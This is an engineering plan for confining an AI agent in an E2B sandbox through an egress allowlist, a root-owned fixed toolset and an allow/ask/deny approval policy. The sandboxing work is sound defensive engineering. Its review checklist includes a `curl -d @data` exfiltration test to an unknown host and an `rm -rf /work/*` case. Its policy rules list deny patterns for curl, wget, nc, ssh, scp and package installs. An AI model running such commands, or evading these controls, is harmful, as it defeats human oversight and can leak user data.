# Sandbox Template + Agent Policy Implementation Plan (v2, after review)

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** The web agent runs common tasks with almost no approval prompts, using a fixed preinstalled toolset it cannot extend, while data leaving the sandbox and outward actions are blocked or asked.

**Architecture:** (1) The network is the real wall: sandbox egress goes only to an allowlist, so packages cannot be downloaded and data cannot be sent to unknown hosts. (2) The E2B template bakes a fixed toolset into root-owned `/opt/simp`; nothing user-installed survives in the home snapshot. (3) The server's `Run.approve` classifies each call `allow` / `ask` / `deny` with a small server-side policy; `ask` uses today's approval flow, and `ask` always wins over "always allow". (4) The sandbox prompt lists the toolset from one manifest shared by the template build and the server.

**Tech Stack:** Python 3.13, e2b SDK, simp_server, simp_agent session hooks.

**Spec:** artifact https://claude.ai/artifact/Ayd4MwxZ82o5B6rd9wmqGr + this conversation.

## Global Constraints

- Workspace path is `/work`. Allowed write roots = `SANDBOX_DIRS` (`e2b.py:37`).
- Toolset: root-owned `/opt/simp`, no `PIP_USER`, no user npm prefix on PATH.
- Size target: ~0.6 GB, ~1.1 GB with `--office`. Template never counts toward quota; only `/work` does.
- `SUDO_CHECK` invariant stays.
- Deny returns a reason string to the model.
- Docker sandbox kind is dev-only: it gets the same manifest install but no egress filter (stated in docs).
- No mode toggle in v2: default behavior = "auto". Toggle deferred until users ask.
- Branch + PR, never push to master.

## Review Focus

1. Auto mode + MCP read + `curl -d @data https://unknown` → network refuses it (egress allowlist). Live test.
2. `pip install --target /work/lib x`, `npm install x`, `uv pip install` → fail because the package index is unreachable, whatever the regex says. Live test.
3. User clicks "always" on one bash call, then the agent runs `rm -rf /work/*` → still asked.
4. Old session with `home.tar.zst` holding `.local`/`.venvs` → not restored; old snapshot deleted once.
5. (accepted) `rm` in `/work` runs without asking and is permanent.
6. MCP tool named `send_*`/`delete_*`/`share_*`/`trash_*` but marked read-only by its server → still asked.

---

## File Structure

- Create `apps/server/src/simp_server/sandboxes/toolset.py` — manifest (`PIP`, `APT`, `OFFICE_APT`, `prompt_list(office)`, `EGRESS_DEFAULT`).
- Modify `apps/server/sandboxes/e2b_template.py` — `build_steps(office) -> list` from manifest; install into `/opt/simp/venv`.
- Modify `apps/server/sandboxes/Dockerfile` — same venv from manifest (dev parity).
- Modify `apps/server/src/simp_server/sandboxes/e2b.py` — egress config at create, `HOME_DIRS`/`RESTORE_SH`, prompt hint, one-time snapshot cleanup.
- Create `apps/server/src/simp_server/policy.py` — `classify(call, mcp_write) -> (verdict, reason)`.
- Modify `apps/server/src/simp_server/server.py:375` (`approve`) and `packages/simp_agent/src/simp_agent/session/__init__.py:195-221` (deny reason + ask beats always).
- Tests: `apps/server/tests/test_e2b_template.py`, `test_policy.py`, `test_server.py`, `test_e2b_sandbox.py`, `test_e2b_live.py`, `packages/simp_agent/tests/test_session.py`.

---

### Task 1: Egress allowlist (spike first — gate for everything else)

**Files:** `sandboxes/e2b.py` (create), `toolset.py` (`EGRESS_DEFAULT`), settings `[sandbox] egress_allow`.

- [ ] **Step 1: Spike (≤ 1 h):** confirm what the installed e2b SDK offers for outbound filtering (`network` allow/deny lists, or only `allow_internet_access`). Write it into the PR. **If no allowlist is possible, stop and report to the user**: auto mode then needs `curl/wget/requests/nc/ssh/scp` to non-allowlisted hosts at `ask`, which is weaker; the user decides.
- [ ] **Step 2: Live failing test** `test_egress_allowlist` in `test_e2b_live.py`: `curl -sI https://pypi.org` fails; `curl -sI https://registry.npmjs.org` fails; `curl -sI https://<EGRESS_DEFAULT[0]>` succeeds.
- [ ] **Step 3:** pass `egress_allow` from settings (default `EGRESS_DEFAULT`) at sandbox create. Default allowlist = the R2/s3fs endpoint only (web goes through server tools, Task 1b); set `dns_servers=[]` and write the endpoint into `/etc/hosts` at create. The R2 endpoint must be in the list — check `mount` in `e2b.py` for the endpoint.
- [ ] **Step 4:** live test passes; existing `test_e2b_live.py` still passes (mount works).
- [ ] **Step 5: Commit** `sandbox: outbound network allowlist`

### Task 1b: Server-side web tools strong enough that the agent never needs sandbox `curl`

Why: with egress closed, `web_search`/`web_fetch` are the agent's only way to the web. Today DuckDuckGo lite blocks after a few calls and plain `urllib` gets 403 on many sites, so the agent falls back to `curl` in the sandbox (seen in a real session).

**Files:** `apps/server/src/simp_server/web_tools.py` (`PROVIDERS` at :178, `do_fetch` :181, `do_search` :192), settings `[web] search_provider = "tavily"`, key `TAVILY_API_KEY` (env / keys store like other keys), `deploy/env.example`, sandbox prompt hint.

**Interfaces:**
- `tavily_search(query: str, count: int, post=http_post) -> list[dict]` → same shape as `ddg_search` (`title`, `url`, `snippet`); registered as `PROVIDERS["tavily"]`. Endpoint `POST https://api.tavily.com/search`.
- `do_fetch(url, max_chars=20000, raw: bool = False, get=http_get)`: browser-like headers (`User-Agent` of a current Chrome, `Accept`, `Accept-Language: vi,en`); on 403/429/empty text fall back to Tavily extract (`POST https://api.tavily.com/extract`); `raw=True` returns the HTML/JS body (truncated) without `html_to_text`.
- Provider fallback: if `TAVILY_API_KEY` missing or Tavily errors → `duckduckgo`.
- New `http_post(url, json_body, headers)` beside `http_get`, reusing `check_url` (SSRF guard stays).

- [ ] **Step 1: Failing tests** in `test_web_tools.py` (fake `post`/`get`, no network): `test_tavily_search_maps_results`; `test_search_falls_back_to_ddg_without_key`; `test_fetch_falls_back_to_extract_on_403`; `test_fetch_raw_returns_html`; `test_tavily_key_never_in_tool_output`.
- [ ] **Step 2:** FAIL. **Step 3:** implement; add `raw` to the `web_fetch` tool schema. **Step 4:** PASS.
- [ ] **Step 5:** prompt hint gains: `"The sandbox has no internet. Get web data only with web_search / web_fetch (raw=true for page source). If they fail, say so; do not try curl."` Policy deny reason for `curl|wget|nc|ssh|scp` = same sentence.
- [ ] **Step 6:** restart simp-server :8766; manual check: ask the agent the Korea metro route question from the example session; it uses `web_search`/`web_fetch`, no bash network call.
- [ ] **Step 7: Commit** `web: Tavily search + fetch fallback so the agent stays off sandbox curl`

### Task 2: Toolset manifest + read-only template + prompt line

**Files:** `toolset.py`, `e2b_template.py`, `Dockerfile`, `e2b.py` (`prompt_hint`), tests `test_e2b_template.py`, `test_e2b_sandbox.py`, `test_e2b_live.py`.

**Interfaces:** Produces `PIP: list[str]`, `APT: list[str]`, `OFFICE_APT: list[str]`, `prompt_list(office: bool) -> str`, `build_steps(office: bool) -> list[str]` (pure).

Manifest: PIP `pandas numpy matplotlib openpyxl python-docx python-pptx pypdf pdfplumber reportlab lxml pillow requests beautifulsoup4`; APT adds `tesseract-ocr tesseract-ocr-vie tesseract-ocr-eng fonts-noto-core fonts-dejavu-core`; OFFICE_APT `libreoffice-nogui`.

- [ ] **Step 1: Failing tests:** `test_build_steps_read_only` — steps create `/opt/simp/venv`, pip-install every `PIP`, `chown -R root:root /opt/simp && chmod -R go-w /opt/simp`; envs have no `PIP_USER`/`NPM_CONFIG_PREFIX`, PATH starts with `/opt/simp/venv/bin`, has no `/home/user`. `test_prompt_hint_lists_tools` — hint contains `prompt_list(office)` and `"Libraries are fixed: do not install packages; save files under /work."`, no `/opt/simp`.
- [ ] **Step 2:** FAIL. **Step 3:** implement; template script imports `simp_server.sandboxes.toolset`; Dockerfile installs the same list (generate the pip line from `toolset.PIP` in a test that compares).
- [ ] **Step 4:** PASS.
- [ ] **Step 5: Live:** build alias `simp-sandbox-next`; `test_template_toolset`: imports of pandas/docx/pptx/openpyxl/pdfplumber work; `touch /opt/simp/x` fails; `tesseract --list-langs` has `vie`; `pip install --target /work/x six` fails (Review Focus 2). Record size in PR.
- [ ] **Step 6: Commit** `sandbox: fixed read-only toolset, listed in the prompt`

### Task 3: Home snapshot stops carrying libraries

**Files:** `e2b.py:40-48`, `test_e2b_sandbox.py`.

- [ ] **Step 1: Failing test** `test_snapshot_carries_no_libraries`: `HOME_DIRS` (a string) contains none of `.local`, `.npm-global`, `.venvs`; `RESTORE_SH` contains `--exclude=.local --exclude=.npm-global --exclude=.venvs`; on create, an existing `/work/.simp/home.tar.zst` is removed once (marker `/work/.simp/home.v2`).
- [ ] **Step 2–4:** FAIL → implement (if `HOME_DIRS` becomes empty, drop snapshot code path but keep it a no-op) → PASS.
- [ ] **Step 5: Commit** `sandbox: home snapshot no longer holds user libraries`

### Task 4: Server policy + session fixes

**Files:** create `apps/server/src/simp_server/policy.py`; modify `server.py` (`approve`), `session/__init__.py:195-221`; tests `apps/server/tests/test_policy.py`, `test_server.py`, `packages/simp_agent/tests/test_session.py`.

**Interfaces:**
- `classify(call: ToolCall, mcp_write: bool, available: str) -> tuple[Literal["allow","ask","deny"], str]`.
- Session: `approve` may return `("deny", reason)`; `_before_tool_call` returns `f"blocked: {reason}"`. Session asks `approve` for every call in `needs_approval` even if in `always_allowed`, passing `always=True`; the server returns `"allow"` for `always` unless verdict is `ask`.

Rules (first match wins):
- bash **deny**: `\bpip3?\b.*\binstall\b|-m\s+pip\b|\buv\s+pip\b|\bnpm\s+(i|install|add)\b|\bnpx\b` → reason `"libraries are fixed. Available: " + available`. `/opt/simp` or `pip3? (list|freeze|show)` → `"not available"` (user's requirement: libraries not browsable; cosmetic, documented as such).
- bash **deny**: `\b(curl|wget|nc|ssh|scp)\b` → reason = the Task 1b "no internet" sentence (network blocks it anyway; this only explains).
- bash **ask**: `git push`.
- write/edit: normalize relative path against `/work`; outside `SANDBOX_DIRS` → deny.
- MCP: `mcp_write` **or** name matches `send|delete|share|trash|permission|remove|create_event|update` → ask.
- Else allow.

- [ ] **Step 1: Failing tests:** table `test_classify` (`python a.py`→allow, `pip install six`→deny w/ "pandas", `npm install x`→deny, `uv pip install x`→deny, `git push`→ask, write `out.docx`→allow, write `/etc/x`→deny, MCP `gmail_send` with `mcp_write=False`→ask). `test_ask_beats_always` (session: "always" on bash, then an ask verdict still emits `approval_request`). `test_deny_reason_reaches_model` (tool result contains "libraries are fixed"). `test_safe_bash_no_prompt` (no `approval_request` in log).
- [ ] **Step 2:** FAIL. **Step 3:** implement. **Step 4:** PASS. **Step 5:** restart simp-server :8766.
- [ ] **Step 6: Commit** `server: policy decides allow/ask/deny; ask beats always`

### Task 5: (dropped) Deletes in /work

Decision 2026-11-21: deletes inside `/work` are accepted and permanent (no versioning, no backup, no ask). Revisit later.

### Task 6: Rollout

- [ ] Point prod template alias to the new build; update `docs/operations.md` (rebuild, `--office`, size, egress list, docker = dev-only).
- [ ] `uv run pytest apps/server packages/simp_agent -q` → all pass.
- [ ] PR; release tag + GitHub Release notes.
